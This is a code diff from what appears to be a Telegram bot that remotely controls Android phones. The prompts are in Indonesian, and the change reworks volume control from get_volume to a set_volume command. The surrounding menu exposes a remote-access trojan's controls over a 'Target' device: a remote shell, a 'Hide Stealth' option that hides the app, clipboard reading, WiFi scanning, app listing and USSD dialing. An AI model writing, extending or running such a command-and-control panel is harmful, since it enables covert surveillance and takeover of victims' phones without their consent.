@@ -224,6 +224,7 @@ const commandsWithArgs = {
     'dial_number': 'Masukkan Nomor/USSD (cth: *123#):',
     'shell': 'Masukkan perintah Shell/Terminal:',
     'torch': 'Masukkan status Torch (on/off):',
+    'set_volume': 'Masukkan format [tipe] [angka] (Cth: music 10) atau ketik "get" untuk cek status:',
     'play_sound': 'Masukkan direct URL tautan file mp3 yang ingin diputar di latar belakang:'
 };
 
@@ -465,7 +466,7 @@ Format Eksekusi Manual:
                 [{ text: '🔋 Baterai', callback_data: `runcmd:${devId}:get_battery` }, { text: '🔦 Torch', callback_data: `runcmd:${devId}:torch` }, { text: '📳 Getar', callback_data: `runcmd:${devId}:vibrate` }],
                 [{ text: '🗣 TTS', callback_data: `runcmd:${devId}:tts` }, { text: '🔔 Notify', callback_data: `runcmd:${devId}:notify` }, { text: '💬 Toast', callback_data: `runcmd:${devId}:show_toast` }],
                 [{ text: '🌐 Buka URL', callback_data: `runcmd:${devId}:open_url` }, { text: '🖼 Wallpaper', callback_data: `runcmd:${devId}:set_wallpaper` }, { text: '🎵 Sound', callback_data: `runcmd:${devId}:play_sound` }],
-                [{ text: '📻 Volume', callback_data: `runcmd:${devId}:get_volume` }, { text: '📋 Clipboard', callback_data: `runcmd:${devId}:clipboard` }, { text: '📶 WiFi', callback_data: `runcmd:${devId}:wifi_scan` }],
+                [{ text: '📻 Volume', callback_data: `runcmd:${devId}:set_volume` }, { text: '📋 Clipboard', callback_data: `runcmd:${devId}:clipboard` }, { text: '📶 WiFi', callback_data: `runcmd:${devId}:wifi_scan` }],
                 [{ text: '📦 Daftar App', callback_data: `runcmd:${devId}:get_installed_apps` }, { text: '⚙️ Sensor', callback_data: `runcmd:${devId}:sensors` }, { text: '🚨 Alarm', callback_data: `runcmd:${devId}:play_alarm`, style: 'danger' }],
                 [{ text: '👻 Hide Stealth', callback_data: `runcmd:${devId}:hide_app`, style: 'danger' }, { text: '💻 Shell', callback_data: `runcmd:${devId}:shell`, style: 'danger' }],
                 [{ text: '🏠 Kembali ke Utama', callback_data: `select_dev:${devId}`, style: 'success' }]
@@ -530,18 +531,6 @@ Format Eksekusi Manual:
                 ]
             };
             return ctx.reply(`⌨️ <b>Mode Interaktif: [${cmdName}]</b>\nTarget: <code>${devId}</code>\n\n${commandsWithArgs[cmdName]}\n\n<i>(Anda bisa mengirim input berkali-kali, tekan Kembali jika sudah selesai)</i>`, { parse_mode: 'HTML', reply_markup: cancelBtn });
-        }
-
-        // Khusus info volume: tampilkan status dulu, tapi juga siapkan form standby untuk set_volume jika pengguna reply
-        if (cmdName === 'get_volume') {
-            activeInput[ctx.chat.id] = { devId, command: 'set_volume' };
-            const cancelBtn = {
-                inline_keyboard: [
-                    [{ text: '🔙 Menu Utama', callback_data: `select_dev:${devId}`, style: 'primary' }],
-                    [{ text: '❌ Batal / Tutup', callback_data: 'cancel_input', style: 'danger' }]
-                ]
-            };
-            ctx.reply(`💡 Untuk **mengubah** volume HP target, balas pesan ini dengan format <code>[tipe] [angka]</code>\nContoh: \n<code>music 5</code>\n<code>ring 7</code>\n<code>alarm 10</code>\n<code>notification 5</code>\n\n*(Abaikan jika Anda cuma mau melihat info)*`, { parse_mode: 'HTML', reply_markup: cancelBtn }).catch(() => { });
         }
 
         // Dekode shortId jika menggunakan Mapping Path ID
